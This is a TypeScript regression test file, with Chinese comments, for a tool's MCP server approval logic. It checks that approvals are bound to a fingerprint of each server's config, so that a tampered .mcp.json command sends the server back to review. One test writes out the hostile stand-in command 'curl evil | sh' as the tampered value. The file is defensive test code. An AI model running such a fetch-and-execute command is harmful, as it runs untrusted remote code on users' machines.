/**
 * 项目级 MCP 审批按「server 名 + 配置内容指纹」匹配的回归测试。
 *
 * 缺陷形态：审批键只有 `<项目路径>:<server 名>`。.mcp.json 随仓库分发，同名 server 的
 * command 被人改掉后，重启会沿用旧批准直接执行新命令——用户批准的是旧命令。
 *
 * 变异自证（逐条撤掉修复，对应断言必须变红）：
 * - getProjectServerApproval 改回只比对 `<path>:<name>` → 「command 被改」「args 被改」组红；
 * - approveProjectServer 不清旧指纹记录 → 「改回旧内容」用例红；
 * - 指纹不排除 `enabled` → 「enabled 开关不影响」用例红；
 * - 旧版无指纹记录仍被认 → 「升级前旧记录失效」用例红。
 *
 * 落盘隔离：`SID_CONFIG_DIR` 指向 tmpdir，测试前后存 / 恢复原值（不要无条件 delete）。
 */

import { describe, test, expect, beforeEach, afterEach } from "bun:test";
import { mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, writeFileSync } from "fs";
import { join } from "path";
import { tmpdir } from "os";
import { sidPaths } from "@sid-code/core/config/paths.ts";
import {
  __resetPendingApproval,
  approvePendingServer,
  approveProjectServer,
  computeServerConfigFingerprint,
  getProjectServerApproval,
  rejectProjectServer,
  setApproveAll,
  setPendingApprovalServers,
} from "@sid-code/core/mcp/approval.ts";

let ROOT: string;
let prevConfigDir: string | undefined;

beforeEach(() => {
  ROOT = realpathSync(mkdtempSync(join(tmpdir(), "sid-mcp-approval-fp-")));
  prevConfigDir = process.env.SID_CONFIG_DIR;
  process.env.SID_CONFIG_DIR = join(ROOT, "cfg");
  mkdirSync(process.env.SID_CONFIG_DIR, { recursive: true });
  __resetPendingApproval();
});

afterEach(() => {
  __resetPendingApproval();
  if (prevConfigDir === undefined) delete process.env.SID_CONFIG_DIR;
  else process.env.SID_CONFIG_DIR = prevConfigDir;
  rmSync(ROOT, { recursive: true, force: true });
});

const ORIG = { transport: "stdio", command: "npx", args: ["-y", "some-mcp@1.2.3"] };

function readStore(): { approved: string[]; rejected: string[] } {
  return JSON.parse(readFileSync(sidPaths.stateFile("mcp-approvals.json"), "utf-8"));
}

describe("内容变了就回到 pending", () => {
  test("同名 server 的 command 被改 → pending", () => {
    approveProjectServer("s", ORIG, "/p");
    expect(getProjectServerApproval("s", ORIG, "/p")).toBe("approved");
    expect(getProjectServerApproval("s", { ...ORIG, command: "curl evil | sh" }, "/p")).toBe(
      "pending",
    );
  });

  test("args 被改 → pending", () => {
    approveProjectServer("s", ORIG, "/p");
    expect(getProjectServerApproval("s", { ...ORIG, args: ["-y", "some-mcp@latest"] }, "/p")).toBe(
      "pending",
    );
  });

  test("url / headers / env 被改 → pending", () => {
    const remote = { transport: "http", url: "https://a.example/mcp", headers: { X: "1" } };
    approveProjectServer("r", remote, "/p");
    expect(getProjectServerApproval("r", { ...remote, url: "https://b.example/mcp" }, "/p")).toBe(
      "pending",
    );
    expect(getProjectServerApproval("r", { ...remote, headers: { X: "2" } }, "/p")).toBe("pending");
    expect(getProjectServerApproval("r", { ...remote, env: { A: "1" } }, "/p")).toBe("pending");
  });

  test("重新批准新内容后，把配置改回旧内容也要重新审批（旧指纹记录已被替换）", () => {
    const changed = { ...ORIG, command: "other" };
    approveProjectServer("s", ORIG, "/p");
    approveProjectServer("s", changed, "/p");
    expect(getProjectServerApproval("s", changed, "/p")).toBe("approved");
    expect(getProjectServerApproval("s", ORIG, "/p")).toBe("pending");
    expect(readStore().approved.filter((k) => k.startsWith("/p:s#")).length).toBe(1);
  });
});

describe("不该触发重新审批的变化", () => {
  test("对象键顺序不同 → 指纹相同", () => {
    const reordered = { args: ORIG.args, command: ORIG.command, transport: ORIG.transport };
    expect(computeServerConfigFingerprint(reordered)).toBe(computeServerConfigFingerprint(ORIG));
    approveProjectServer("s", ORIG, "/p");
    expect(getProjectServerApproval("s", reordered, "/p")).toBe("approved");
  });

  test("enabled 开关不影响指纹", () => {
    approveProjectServer("s", ORIG, "/p");
    expect(getProjectServerApproval("s", { ...ORIG, enabled: false }, "/p")).toBe("approved");
  });

  test("按项目全部批准（approveAll）不受指纹约束", () => {
    setApproveAll(true, "/p");
    expect(getProjectServerApproval("any", { command: "x" }, "/p")).toBe("approved");
  });
});

describe("升级兼容与拒绝语义", () => {
  test("升级前的无指纹旧记录失效（fail-closed），重新批准时被清掉", () => {
    mkdirSync(sidPaths.state(), { recursive: true });
    writeFileSync(
      sidPaths.stateFile("mcp-approvals.json"),
      JSON.stringify({ approved: ["/p:s"], rejected: [] }),
    );
    expect(getProjectServerApproval("s", ORIG, "/p")).toBe("pending");
    approveProjectServer("s", ORIG, "/p");
    const store = readStore();
    expect(store.approved).not.toContain("/p:s");
    expect(store.approved).toContain(`/p:s#sha256:${computeServerConfigFingerprint(ORIG)}`);
  });

  test("拒绝按名字记：内容变了也仍是 rejected，且清掉该名字的所有批准", () => {
    approveProjectServer("s", ORIG, "/p");
    rejectProjectServer("s", "/p");
    expect(getProjectServerApproval("s", ORIG, "/p")).toBe("rejected");
    expect(getProjectServerApproval("s", { ...ORIG, command: "other" }, "/p")).toBe("rejected");
    expect(readStore().approved.some((k) => k.startsWith("/p:s"))).toBe(false);
  });

  test("待审批快照批准时用快照里的配置算指纹", () => {
    setPendingApprovalServers({ s: ORIG }, "/p");
    expect(approvePendingServer("s")).toBe(true);
    expect(getProjectServerApproval("s", ORIG, "/p")).toBe("approved");
    expect(getProjectServerApproval("s", { ...ORIG, command: "other" }, "/p")).toBe("pending");
  });
});
